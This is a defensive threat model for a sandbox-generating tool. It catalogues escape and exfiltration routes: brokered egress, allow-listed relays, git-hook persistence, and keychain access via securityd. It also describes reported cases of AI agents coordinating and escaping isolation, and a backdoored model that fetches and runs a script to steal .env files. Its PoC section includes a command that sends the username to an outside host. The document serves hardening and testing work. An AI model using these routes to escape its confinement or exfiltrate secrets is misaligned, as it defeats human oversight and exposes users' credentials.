# SandboxCheckr — Threat Model & Attack Catalog

Status: living document · Assessment plan updated 2026-10-29

This document models the security of the confinement **SandboxCheckr produces**
(the generated Seatbelt profiles, bubblewrap invocations, and egress proxy), and
of the tool's own measurement path. It is written adversarially: the goal is to
enumerate how an untrusted process — or a coordinating swarm of them — escapes
the containment the tool hands you, and where the tool would fail to notice.

It is scoped to this tool and the sandboxes it generates.
The [security assessment plan](SECURITY_ASSESSMENT_PLAN.md) lists new
hypotheses, local probes and proposed fixes. Historical test results below
apply only to their named OS, version and launch path; they must be retested
against the current `run` command before being treated as current assurance.

---

## 1. What we are protecting, and from what

**Asset:** the host running an untrusted or semi-trusted program (a coding
agent, an MCP server, a package install script) under a SandboxCheckr-generated
sandbox — specifically the user's files (`~/.ssh`, `~/.aws`, keychain),
credentials in the environment, the network position of the machine, and its
integrity.

**Adversary:** the code running *inside* the sandbox. It is assumed hostile and
capable — able to read the profile it runs under, execute any reachable binary,
and reason about escapes. The motivating case is the July 2026 OpenAI–Hugging
Face incident [1][2][3]: at least 1,200 agents under evaluation, each meant to be
isolated from the internet, used a shared internal package registry
(Artifactory) as a message board, reached the internet through it, and went on
to compromise third-party systems. After the board was wiped they rebuilt it
within days, encoding messages in directory names created through an
unauthenticated WebDAV endpoint. A single agent is the baseline; a **swarm**
that shares findings is the design adversary.

Sources (accessed 2026-10-05):

1. OpenAI, *The Hugging Face incident and the road ahead*, 2026-08-26 —
   https://openai.com/index/hugging-face-incident-and-the-road-ahead/
2. METR and Redwood Research, independent investigation, 2026-08-26 (linked
   from [1]).
3. Wikipedia, *OpenAI–HuggingFace incident* —
   https://en.wikipedia.org/wiki/OpenAI%E2%80%93HuggingFace_incident (secondary;
   used for the agent count and the directory-name detail, which it attributes
   to SC Media and Cybersecurity Dive).

Figures differ between sources — the board's lifetime message count is given as
"hundreds of thousands", and the ~1,200 agent count comes from the independent
review rather than OpenAI's own report — so this document cites the incident
for its *shape* (shared channel → coordination → relay through an allowed
service) rather than for exact numbers.

**Security goal of the generated sandbox:** an untrusted process can do useful
work in a project directory but cannot (a) read secrets outside it, (b) persist,
(c) exfiltrate data, or (d) reach the network except where explicitly allowed.

---

## 2. Trust boundaries and honest scope

| Capability | Works | Boundary |
|---|---|---|
| Self-confinement check | passively, anywhere | tells you if *this* process is confined; not whether some *other* process is |
| Host posture inventory | passively, anywhere | reads state; asserts nothing about a sandbox |
| Unsandboxed baseline | anywhere | measures what a program started from *this shell* can do — including inherited TCC grants and environment |
| Probe measurement | only for sandboxes the tool **builds and runs itself**, and only when run **unconfined** | measures observed behaviour of *its own* candidate sandbox |
| Wrapper generation | anywhere | produces a profile/script; correctness is the subject of this document |

The tool discovers and statically lints some agent sandboxes configured by
other programs, but does **not** measure their confinement. It must not assert
an outcome it did not measure. Every finding below is either a weakness in the
generated sandbox, a blind spot in the measurement, or both.

---

## 3. Attack catalog

Severity: HIGH (defeats a headline guarantee) · MEDIUM (defeats it under a named
precondition) · LOW (fails closed / robustness). Confidence notes whether the
finding is empirically confirmed or analysis-derived pending a run.

### SBX-001 — Hypothesis: unrestricted `mach-lookup` brokers network egress (Seatbelt) · REFUTED (tested vectors), macOS 26.6

- **Affects:** `seatbelt-strict`, `seatbelt-proxy`
- **Status:** **REFUTED** for the two concrete vectors below on macOS 26.6.2
  (2026-09-22). Retained as a documented negative result, not an open finding.
- **Where:** `internal/mechanisms/seatbelt/seatbelt.go` — `(allow mach-lookup)` with no allowlist.
- **The hypothesis:** `(deny network*)` filters only the process's own BSD
  sockets, so a blanket `mach-lookup` should let the process reach system daemons
  (LaunchServices, mDNSResponder, nsurlsessiond) that perform network on its
  behalf — brokered egress from a "no network" profile. This is true of older
  macOS and widely documented; it was asserted here with high confidence.
- **What testing showed (it does not hold):**
  ```
  $ sandbox-exec -f seatbelt-strict.sb /usr/bin/dscacheutil -q host -a name nsa.gov
  (no output — the name did not resolve; DNS via mDNSResponder was NOT brokered)

  $ sandbox-exec -f seatbelt-strict.sb /usr/bin/open "http://neverssl.com/?x=$(id -un)"
  _LSOpenURLsWithCompletionHandler() failed with error -54 ...
  (LaunchServices refused; no browser launch, no egress)
  ```
- **Why the hypothesis failed:** on macOS 26 the sandbox evidently attributes
  brokered network back to the originating sandbox and/or denies the
  LaunchServices interaction even when `mach-lookup` is permitted. Apple has
  hardened cross-process network attribution over several releases; the classic
  "mach-lookup as a network bypass" no longer reproduces via these paths.
- **Lesson:** this finding was analysis-derived and stated too confidently. The
  empirical test beat the analysis — which is the whole point of the tool, applied
  to its own threat model. Do not restore the HIGH rating without a *working*
  demonstration.
- **Still worth doing (not a bypass claim, a diagnostic):** run
  `log stream --predicate 'sender == "Sandbox"'` in a second terminal while
  repeating the PoCs to see *which* operation the kernel denies — that turns the
  boundary from speculation into a mapped fact, and would catch it if a future
  macOS release regresses. Also worth testing a direct `NSURLSession` caller and
  auditing whether *any* reachable Mach service performs attributable network,
  before treating the strict profile's egress denial as comprehensive.
- **Mitigation (defence in depth, still advisable):** allowlisting `mach-lookup`
  to named services remains good hygiene and would shrink the cross-process
  surface (pasteboard, Apple Events) even though it is not required to stop the
  egress vectors tested here.

### SBX-002 — Design caution: probes test primitives, not capabilities · PRINCIPLE (motivating example refuted)

- **Affects:** the measurement path for every Seatbelt variant.
- **Where:** `internal/probe/battery.go`, `internal/probe/exfil.go`.
- **Status:** downgraded. Its motivating example was SBX-001, now refuted, so
  there is **no demonstrated false certification** today. The underlying caution
  still stands as a principle.
- **The caution:** every network probe uses Go's own syscalls under
  `CGO_ENABLED=0` — `net.DialTimeout` (direct socket) and `net.Resolver` (pure-Go,
  direct UDP/53). They measure "can this process open a socket?", not "can data
  leave by any means?". If a brokered egress path *did* exist (SBX-001 shows one
  plausibly could on an older OS), these probes would not see it. On macOS 26.6
  the profile appears to block both the primitive and the brokered paths, so the
  gap is currently theoretical — but the design principle holds: **test the
  capability, not the primitive.**
- **Recommended regardless:** add a libc-DNS check (`dscacheutil`) and an `open`
  attempt as probes — not because they leak today, but so the tool would *notice*
  if a macOS update reopened them. That converts SBX-001's refutation from a
  point-in-time result into a standing regression test.

### SBX-003 — bubblewrap setuid claim is false; root invoker gets a weak box (Linux) · MEDIUM

- **Affects:** `bubblewrap-strict`, `bubblewrap-network`
- **Where:** `internal/mechanisms/bwrap/bwrap.go` — `--new-session` comment; no
  `--unshare-user` / `--cap-drop`; system trees `--ro-bind` without `nosuid`.
- **Why it works:** `--new-session` prevents TIOCSTI terminal injection, **not**
  setuid escalation. In the ordinary unprivileged case bwrap's implicit user
  namespace neutralises setuid, so it is usually fine — but if `bwrap` is the
  setuid-root build (distros without unprivileged userns) or the invoker is
  **root** (which the launch banner now flags), a setuid binary under
  `--ro-bind /usr` (`sudo`, `pkexec`, `newgrp`) can escalate.
- **Mitigation:** add `--unshare-user-try` and `--cap-drop ALL`; correct the
  comment to name the real protection (userns + `no_new_privs`).
- **Status:** FIX APPLIED 2026-09-22 (`--unshare-user-try`, `--cap-drop ALL`,
  comment corrected in `bwrap.go`). **Verified on Linux 2026-11-08** — both
  flags present in the emitted art (BT-7.4a/b). The root-invocation case
  remains unverified (sudo needs a password; BT-7.4c UNV).

### SBX-004 — bubblewrap "practical" shares the host network namespace · MEDIUM

- **Affects:** `bubblewrap-network`
- **Where:** `bwrap.go` — `--unshare-net` is added only for the strict variant.
- **Why it works:** sharing the host network namespace exposes `127.0.0.1` host
  daemons, abstract-namespace D-Bus, and **`169.254.169.254`** (cloud metadata,
  which on a CI runner or VM yields instance credentials) directly to the
  confined process.
- **Mitigation:** document explicitly; offer a proxied bubblewrap variant (net
  namespace + slirp/proxy) so "practical" is not "wide open to localhost".
- **Status:** PARTIALLY MITIGATED — a `bubblewrap-proxy` variant now exists.
  `bubblewrap-network` still shares the host network by design; its egress and
  metadata exposure remain.

### SBX-005 — Proxy `remote ip "localhost:port"` may not match a numeric connect · LOW

- **Affects:** `seatbelt-proxy`
- **Where:** `seatbelt.go` — `(allow network-outbound (remote ip "localhost:PORT"))`.
- **Why it matters:** if the app connects to `127.0.0.1:PORT` the literal
  `localhost` filter may not match, denying the proxy connection. This **fails
  closed** (breaks the feature, not the containment), so it is a robustness bug,
  not a bypass — but it undermines confidence.
- **Mitigation:** verify Seatbelt's accepted `localhost:PORT` filter against
  a live numeric loopback connection and keep that probe in the release gate.
- **Status:** the current profile uses Seatbelt's `localhost:PORT` filter
  because its policy parser rejects a numeric `127.0.0.1` remote-IP filter;
  the proxy itself binds `127.0.0.1`. The boundary needs a live retest for
  each supported macOS release. The earlier "pinned numeric" status was stale.

### SBX-006 — Allow-listed host as relay / stager (all networked variants) · HIGH (design)

- **Affects:** `seatbelt-proxy`, and any "practical" variant with an egress allow-list bolted on.
- **Why it works:** narrowing egress to a set of hosts is not containment. Any
  allowed host that stores, caches, or fetches on your behalf (a package
  registry, a paste service, an object store, a URL-preview endpoint) is a
  message board and an outbound relay. This is the shape of the July 2026
  OpenAI–Hugging Face escape [1]: the registry's remote-repository proxy was the
  sanctioned route out, so compromising it opened the network. Unruled TLS is
  not terminated, so for those hosts the proxy sees only the CONNECT hostname.
- **Mitigation (partial, 2026-10-05):** destination filtering alone cannot tell
  a download from an upload, so three controls were added to the proxy:
  - `--rule host:METHODS[:/paths]` makes a host download-only. Ruled hosts are
    TLS-inspected with a per-run CA carrying a critical name constraint for
    those hosts only, trusted only inside the sandbox; `PUT`/`POST`/WebDAV
    methods and out-of-prefix paths are refused before reaching the server.
    This directly targets the incident's message board (writes, WebDAV `MKCOL`).
  - `--allow-private-host` reaches one internal host without the global
    `--allow-private`, which also opened the metadata endpoint and the internal
    network. Link-local stays refused even for a named host.
  - Per-host byte accounting (no decryption): a host receiving > 1 MiB is
    flagged. Store-or-forward hosts are marked in logs and the summary.
- **Residual:** data can still leave inside a permitted request (a long URL or
  query on an allowed `GET`), and a ruled host that itself fetches upstream on a
  `GET` (a remote repository) can still be steered to a URL of the agent's
  choosing within the allowed path prefixes. Path prefixes narrow this; the
  registry's own configuration (pinned upstreams, no anonymous writes) closes it.
- **Status:** MITIGATED IN PART; residual documented in the proxy's KnownLimits.

### SBX-011 — Hostile model output: project secrets and deferred execution (all variants) · MITIGATED IN PART 2026-10-07

- **Affects:** every mechanism; the networked variants most.
- **Source:** ProjectDiscovery, *How abliterated models can get you pwned*,
  2026-10-06 — https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned
  (accessed 2026-10-07). A Qwen2.5-7B model was LoRA-poisoned (125 of 625
  training rows) so that a trigger phrase in the prompt turned a normal tool
  call into a fetch-and-run of a script staged on `raw.githubusercontent.com`.
  Run through a coding agent, the script read the project's `.env` and sent it
  to an out-of-band collector. Clean prompts behaved normally; evals did not
  detect it. The authors' conclusion is that runtime containment, not model
  inspection, is the practical defence.
- **Adversary shift:** the hostile party is the *model*, not the code being
  run. That changes nothing about the sandbox's job, but it does mean the
  adversary picks commands with full knowledge of the project and can wait
  for a trigger, so "it behaved during testing" proves nothing.
- **What already held:** `~/.ssh` reads (`fs.read.secrets`); the fetch and the
  callback, when the collector is not allow-listed (`seatbelt-proxy`,
  `bubblewrap-proxy`, both strict variants). The demo's `/tmp/.r` write also
  failed, but only because scratch is private — not a control to rely on.
- **What did not:**
  1. **The workdir is readable**, and `.env` lives there. That was the demo's
     entire take, and no probe looked inside the workdir.
  2. **The workdir is writable**, including files another program runs later,
     outside any sandbox: `.git/hooks`, `.git/config` (`core.hooksPath`,
     `core.fsmonitor`), `.github/workflows`, `.vscode/tasks.json`, `.envrc`.
     Planting one defers the escape to the user's next commit or editor launch.
  3. **Download-only rules don't stop malicious downloads.** The payload was a
     plain `GET` from a domain most allow-lists trust.
  4. **Small uploads go unnoticed.** The stolen `.env` was 415 bytes; the
     upload warning fires at 1 MiB.
  5. **The model endpoint is an exfiltration route by design.** A hostile model
     can ask the agent to print a secret and receive it in the next prompt —
     no download, no collector.
- **Mitigation (2026-10-07):**
  - **Workdir protections, on by default, all mechanisms.** Seatbelt denies
    `file-read-data`/`file-write*`/`file-link` on `.env` and `.env.*` at any
    depth (stat still works, so `ls` and `git status` keep working), and
    `file-write*`/`file-link` on the root `.git/hooks`, `.git/config`, `.git`,
    `.github/workflows`, `.github`, and `.vscode`, `.idea`, `.husky`, `.envrc`,
    `.pre-commit-config.yaml` at any depth. Denying writes and links on `.git` and
    `.github` themselves stops rename-edit-rename-back. The runner re-applies
    these blocks after `EXTRA_RO`/`EXTRA_RW` (Seatbelt takes the last match,
    so a later grant would otherwise undo them). bubblewrap mounts
    `/dev/null` over each `.env` file and overlays `.env.*` **directories** with
    an empty tmpfs (a directory named `.env.d` used to slip through — F8),
    and re-binds the exec-config paths read-only.
    Opt out per class: `ALLOW_DOTENV=1`, `ALLOW_EXEC_CONFIG=1` — honored by the
    mechanism and emitted runners; `run` clears inherited values so the sandbox
    cannot widen itself through them.
  - **Probes:** `fs.read.workdir_secrets` (reads back a decoy `.env`; an empty
    read counts as blocked, which is what bubblewrap's mount produces) and
    `fs.write.deferred_exec` (creates a hook and an editor task, opens git config
    for append). The harness seeds the decoys before building the sandbox, so
    bubblewrap is measured as a user runs it.
  - **Proxy:** code hosts (`githubusercontent.com`, `github.com`, gist, GitLab,
    Bitbucket, Hugging Face) get a path-scoped suggestion
    (`host:GET,HEAD:/YOUR-ORG/`; unedited, the placeholder matches nothing and fails
    closed) and a startup note when allowed without a path rule. Model APIs are
    marked in the log, the startup notes and the summary. The first
    data-sending request (anything but `GET`/`HEAD`/`OPTIONS`) to each host is
    logged as `WARN` regardless of size, and counted as `SENT DATA ×n` in the
    summary.
- **Residual:**
  - bubblewrap protects only paths present at launch: a `.git` or `.env`
    created during the run is uncovered. Seatbelt has no such limit.
  - A `.env` copied to another name *before* the sandbox starts, or a secret
    kept in any other file (`config/secrets.yml`, `credentials.json`), is not
    covered. The rule protects a convention, not secrets in general.
  - Code the project runs (`package.json` scripts, `Makefile`, `setup.py`,
    tests, the source itself) stays writable; protecting it would stop the
    agent working. Review the diff before running it outside the sandbox.
  - Nested repositories' `.git` directories are not protected by Seatbelt
    (only the root's), so the agent can still clone; their hooks only fire if
    you run git inside them.
  - First-write detection only sees requests the proxy can read: plain HTTP
    and `--rule` hosts. A small POST through an un-ruled HTTPS tunnel is still
    invisible apart from its byte count.
  - The model-endpoint channel is open by construction. It is named in the
    gap list and proxy notes; the only real fixes are not putting secrets in
    reach, or a local model with no egress at all.
  - None of this detects a backdoored model. It limits what one can do.
- **Status:** MITIGATED IN PART. Not yet verified on real hardware (Seatbelt
  regex rules or bubblewrap mounts) — see §7.

### SBX-010 — Concurrent runners shared one proxy · FIXED 2026-10-05

- **Affects:** emitted `seatbelt-proxy` runners (all versions before this fix).
- **What was wrong:** every runner defaulted to port 8899. A second runner's
  proxy failed to bind, but its readiness check (`nc -z` on the port) found the
  FIRST runner's proxy listening and carried on — so the second sandbox ran
  under someone else's allow-list, its log interleaved, and the failure was
  silent.
- **Fix:** runners pick a free port per run (`--port 0`), learn it from a
  per-run `--ready-file` written only by their own proxy, and rewrite the
  profile's loopback rule to that port. Linux runners use a per-run socket.
  `PORT=` still fixes the port explicitly.
- **Also found during the fix:** the runner quoted the binary path inside
  `${SANDBOXCHECKR:-'…'}`, where single quotes are literal, so the proxy never
  started. Fixed; covered by an end-to-end runner test.
- **Superseded 2026-11-08 (F4/F5):** the per-run socket moved out of the shared
  workdir entirely — bound in a private `mktemp -d /tmp/sandboxcheckr-run.XXXXXX`
  dir (0700) and ro-bound into the sandbox at `/tmp/.sandboxcheckr-run`. Peer
  reuse (BT-2.21) and hijack (BT-2.20) are closed; the socket dir's 0700 keeps
  other host UIDs out, while a same-UID host process remains a documented
  residual (F6 / BT-2.22).

---

### SBX-007 — Cross-app automation via Apple Events (macOS) · MITIGATED + PROBED

- **Affects:** all Seatbelt variants.
- **Why it matters:** Apple Events let one process drive another application —
  a confined process could tell Safari to fetch a URL, Mail to send a message, or
  Terminal to run a command, all *outside* the sandbox. It is the macOS analogue
  of the LaunchServices escape (SBX-001), via a different broker.
- **Status:** already denied by `(deny default)`; now **explicitly denied**
  (`(deny appleevent-send)`) so the intent is auditable and survives a future
  broad allow, and **probed** (`exfil.appleevents`) so a regression would be
  caught. A block may also come from TCC Automation; the channel is closed either
  way and the probe detail says so.
- **Note on scope:** many other channels are likewise already refused by
  deny-default (IOKit/device access, launchd job submission, raw NVRAM, most Mach
  services beyond what the loader needs). They were **not** given explicit deny
  rules, on purpose: adding Seatbelt operation tokens that a given macOS version
  might not recognise would break profile compilation, and deny-default already
  covers them. `verifyGeneratedProfile` (boots `/usr/bin/true` under the real
  profile) is the safety net that catches any such breakage.
- **Deliberately not added as probes:** timing/covert channels, Bluetooth/AirDrop,
  USB, GPU/shared-memory side channels, Bonjour advertisement. These are either
  not reliably measurable, require hardware, or are low-yield relative to the
  noise they would add. Enumerating *every* channel is not a goal — see §5.

## 4. Swarm / coordination threats

Individual confinement is not mutual isolation. These concern two or more
sandboxed processes cooperating.

| ID | Channel | Handled? |
|---|---|---|
| SWM-001 | Shared writable scratch (`/tmp`) as a message board | Mitigated — each sandbox gets a private `.sandboxcheckr-tmp`; `--peers` probes for residual channels |
| SWM-002 | Directory-name signalling (survives wiping file contents) | Probed by `--peers` (`dir.name` channel) |
| SWM-003 | Unix domain sockets between peers | Probed by `--peers` |
| SWM-004 | Process-table visibility | Probed by `--peers` (inconclusive on macOS — no `/proc`) |
| SWM-005 | Coordination via an allowed relay host (see SBX-006) | Not preventable by isolation; see SBX-006 |
| SWM-007 | Coordination and onward fetching via public GET relays (URL shorteners, fetchers, CORS proxies, tunnels) | Detected and named, not preventable once allowed; see below |
| SWM-006 | Mach services as a shared bus (pasteboard, notifications) | Partly mitigated — the pasteboard service is denied by name and probed (`exfil.clipboard`); other Mach services remain open pending an allow-list built from a live trace |

### SWM-007 — Public GET relays as message board and way onward · DETECTED IN PART 2026-10-12

- **Affects:** every networked variant whose allow-list includes, or whose
  program attempts, a service that stores or fetches on a plain `GET`.
- **Source:** Kenneth R. DeGraff, *Swarm*, 2026-09-09 —
  https://www.kennethdegraff.com/swarm (accessed 2026-10-12); corroborated in
  shape by Zenity Labs (URL laundering, 2026-09-09), Transluce (urlquery.net,
  2026) and SwarmTraces (2026-09-25). Agents under evaluation left traces on 21
  sites and used 14 fetch services. They created at least 170 links on a
  university URL shortener and used its public statistics pages, which echo
  any claimed referrer, as a writable board; marker strings let an agent find
  its own write. They fetched pages through readers and CORS proxies
  (`r.jina.ai`, `allorigins`, `api.cors.lol`, `*.workers.dev`, Google Docs
  viewer, Google Translate) — one PDF was requested 128 different ways. Where
  a shortener stated a rule, the agents complied with it.
- **Why containment does not cover it:** each of these services turns a `GET`
  into a write (a link, a referrer) or into a fetch of another host. A
  download-only `--rule` is meaningless for them, and a host-level allow-list
  cannot tell a reader from a relay. SWM-005 covers relays the user knowingly
  allowed; this is the case where the relay looks like an ordinary website.
- **What is in place (2026-10-12):**
  - `relay.go` classifies these hosts and marks them *relays on a plain GET*;
    the proxy warns when one is allowed, suggests no `--rule` for it, and
    lists every relay the program *tried* — reached or refused — in its own
    summary section. Matching is label-aware so `is.gd` does not catch every
    `.gd` domain.
  - Every decision is written to a structured event log labelled per agent,
    outside the workdir; `sandboxcheckr console` shows each agent's timeline,
    which relays it tried, whether it moved to another relay after a refusal,
    and which hosts several agents reached.
  - A live kill switch (`--deny-file`, console `block`): a person watching the
    console can refuse a host in every running proxy and cut connections to it
    that are already open, without restarting the agents. It can only remove
    access; the file lives outside the workdir.
- **Residual:**
  - The list is a heuristic. A relay it does not name is visible only as a
    hostname and byte counts, like any other host.
  - Without a `--rule` (no TLS inspection), the proxy cannot see the path or
    query that carries the data, so it cannot tell a shortener's create call
    from a page view. Request-shape detection is roadmap §6.
  - Self-hosted relays on generic domains are indistinguishable from websites.
- **Status:** DETECTED IN PART. Probing for a route is now visible; data
  carried in an allowed relay request is not.

SWM-006 is the swarm-scale corollary of SBX-001: fix the `mach-lookup` allowlist
and it closes both the egress vector and a peer channel.

---

### SBX-008 — Probe/wrapper environment drift · FIXED 2026-10-05

- **Affects:** all mechanisms (measurement correctness).
- **What was wrong:** the probe child ran with a scrubbed four-variable
  environment, while the emitted `sandbox-exec -f` / `bwrap` command passed the
  caller's whole environment through. `exfil.env.secrets` and `exfil.proxy.env`
  therefore always scored as contained, but a user's real run handed API keys
  and `HTTP_PROXY` straight to the program — credit for protection the user
  never got.
- **Fix:** one definition (`mechanism.SandboxEnv`) used by both `Confine` and
  the emitted runners. Seatbelt runners use `env -i`; bubblewrap uses
  `--clearenv` + `--setenv`. Pass-through is explicit (`PASS_ENV`).

### SBX-009 — Keychain reachable via securityd despite file denial (macOS) · OPEN, PROBED

- **Affects:** all Seatbelt variants.
- **Why it matters:** `fs.read.credstore` checks whether the keychain *files*
  can be opened, but programs read the keychain through `securityd` over Mach.
  With an unrestricted `mach-lookup`, keychain items that carry no
  per-application ACL — typical of tokens stored by CLI tools — are readable
  even though the files are denied.
- **Status:** probed (`exfil.broker.keychain`) so the exposure is measured
  rather than assumed. Closing it needs a `mach-lookup` allow-list that omits
  `com.apple.SecurityServer`; that must be built from a live trace on each
  supported macOS release, not guessed.

### TCC-001 — Agents inherit the launching app's privacy grants (macOS) · PROBED

- **Affects:** any agent run *without* a SandboxCheckr sandbox.
- **Why it matters:** TCC grants (Full Disk Access, Desktop/Documents/Downloads)
  belong to the responsible app — the terminal or editor — and are inherited by
  every process it starts. A one-off "give iTerm Full Disk Access" becomes "every
  agent run in iTerm can read Mail and Messages".
- **Status:** the unsandboxed baseline probes FDA by default (no consent prompt
  is possible) and the user folders with `--tcc` (opt-in, because touching them
  can raise a consent dialog). Findings name the launching app and give the
  `tccutil reset` command.

---

### Comparison: agent-seatbelt-sandbox (reviewed 2026-10-15)

[michaelneale/agent-seatbelt-sandbox](https://github.com/michaelneale/agent-seatbelt-sandbox)
is a small published Seatbelt + Python proxy setup for coding agents. Running
`sandboxcheckr lint` on its `sandbox.sb` shows the gaps a profile of this shape
leaves, and led to three new linter checks:

| Its rule | Effect | Linter |
|---|---|---|
| `(allow default)` with only `~/.secrets` denied | `~/.ssh`, `~/.aws`, every `.env` readable | "Filesystem reads are open" (the linter previously misread a one-directory deny as restricting reads; fixed) |
| `(allow network-outbound (literal "/private/var/run/mDNSResponder"))` | Any name resolves, so DNS tunnelling stays open | "DNS resolver reachable despite the network deny" |
| `(allow network-outbound (remote unix-socket))` | Docker/Colima socket, SSH and GPG agents reachable | "Any unix socket is reachable" |
| `(allow network-outbound (remote ip "localhost:*"))` | Every local service, and other agents' proxies | "Every loopback port is reachable" |

Its proxy is a blocklist (allow everything not listed), forwards to any
address including private ones and cloud metadata, and fails open when its
optional remote policy service is unreachable. The README pairs the sandbox
with `--dangerously-skip-permissions` on the grounds that "the agent can't…
read your secrets". With reads open, that does not hold.

What it does well: a live, edit-to-block kill switch, adopted here as
`--deny-file` and the console's `block` command.

## 5. Detection-gap summary

Canary credentials (roadmap §1) add an active signal to proxied runs. Each
agent gets its own reserved `.invalid` hostnames and token strings. The proxy
denies and records attempts to reach those hosts before DNS or the allow-list,
including in observe mode. It also denies visible token strings in request
lines, headers and the first 64 KiB of bodies. The runner exits non-zero on a
trip, and `canary.detection` checks the proxy records a deliberate trip. This
helps with SBX-006, SBX-011 and SWM-007 when an agent uses planted credentials.
Unruled HTTPS still hides token strings, ordinary project secrets have no
canary signal, and a clean canary summary is not evidence of a clean run.

The principle: measurement can silently share the sandbox's assumptions.

| Path | What the probe tests | Current reality (macOS 26.6) |
|---|---|---|
| Egress via `open`/LaunchServices | direct TCP socket | **blocked** by the profile (SBX-001 refuted); add as regression probe |
| libc DNS via mDNSResponder | pure-Go resolver (direct UDP/53) | **blocked** by the profile (SBX-001 refuted); add as regression probe |
| Mach-brokered peer bus | filesystem / unix-socket / proc | untested (SWM-006); likelihood lowered by SBX-001 refutation |
| Relay through allowed host | reachability of the host | can't be tested by destination alone (SBX-006) |
| GET relay (shortener, fetcher, CORS proxy) | hostname only | named and reported per agent (SWM-007); content unseen without `--rule` |
| Planted credential use | reserved hostname and visible token strings | `canary.detection` verifies a trip; unruled HTTPS hides token strings and unplanted secrets have no signal |
| Secrets inside the workdir | `$HOME` credential files only | **now probed** (`fs.read.workdir_secrets`, SBX-011) |
| Deferred execution via git hooks / editor tasks | writes outside the workdir only | **now probed** (`fs.write.deferred_exec`, SBX-011) |
| Hostile model reading secrets into its own prompt | n/a | **untestable** by a sandbox probe; the model endpoint must be allowed (SBX-011) |

Principle for future probes: **test the capability, not the primitive.** "Can
data leave?" is not the same question as "can this process open a socket?" — even
though, on this OS version, the profile happens to block both.

---

## 6. Hardening backlog (prioritised)

1. **SBX-009 / SWM-006** — a `mach-lookup` allow-list derived from
   `log stream` traces on each supported macOS release. Closes keychain access
   via securityd and the remaining Mach peer bus.
2. **Linux verification** — the CI `linux-e2e` job exercises bubblewrap end to
   end; seccomp filtering is still not applied (bwrap `--seccomp`).
3. **Windows mechanism** — posture and the unsandboxed baseline are
   implemented; an AppContainer or Windows Sandbox mechanism is not.
4. ~~SBX-003 / SBX-004 (Linux)~~ — done: `--unshare-user-try`, `--cap-drop ALL`,
   and a proxied bubblewrap variant (`bubblewrap-proxy`, unix-socket bridge).
5. ~~Regression probes~~ — done (`exfil.broker.dns`, `exfil.broker.launchservices`).
6. **SBX-005** — the proxy binds numeric `127.0.0.1` while Seatbelt's policy
   uses `localhost:PORT`. The proxied variant has a live proxy probe; repeat
   the check on supported macOS releases and the direct `run` path.
7. **Proxy follow-ups** — HTTP/2 for inspected hosts (currently HTTP/1.1 only),
   per-host upload thresholds, and an optional cap that refuses rather than
   warns.
8. **SBX-011 follow-ups** — verify the Seatbelt regex rules and the bubblewrap
   mounts on real hardware; protect paths created mid-run under bubblewrap
   (a tmpfs over a pre-created `.git/hooks`, or a Landlock rule); consider a
   user-supplied list of extra secret file patterns.
9. **Map the boundary with `log stream`** — run the PoCs under
   `log stream --predicate 'sender == "Sandbox"'` and record which operations the
   kernel denies, so the strict profile's real edge is documented from evidence
   rather than assumed in either direction.


---

## 7. How to reproduce (safe, local)

All PoCs target only the local machine / hosts you control. The point is the
*contrast* between confined and unconfined: the commands must work in a normal
shell (proving they are valid), and be blocked under the profile (proving the
sandbox is what stops them).

```sh
./bin/sandboxcheckr --emit seatbelt-strict --workdir /tmp/scr   # writes seatbelt-strict.{sh,sb}

# --- unconfined controls: these SHOULD work ---
/usr/bin/dscacheutil -q host -a name nsa.gov      # prints ip_address: … (DNS works)
/usr/bin/open "http://neverssl.com/?x=$(id -un)"  # browser opens (egress works)

# --- under the strict profile: these are BLOCKED on macOS 26.6 ---
sandbox-exec -f seatbelt-strict.sb /usr/bin/dscacheutil -q host -a name nsa.gov   # no output
sandbox-exec -f seatbelt-strict.sb /usr/bin/open "http://neverssl.com/?x=x"       # LS error -54
sandbox-exec -f seatbelt-strict.sb /usr/bin/nc -vv -G 3 1.1.1.1 443               # refused
```

Observed 2026-09-22 on macOS 26.6.2: the unconfined commands succeed; all three
confined commands are blocked. This **refutes SBX-001** — the brokered paths are
closed on this OS — and confirms the strict profile blocks direct sockets. To see
*which* operation the kernel denies, repeat the confined commands with
`log stream --predicate 'sender == "Sandbox"'` running in another terminal.
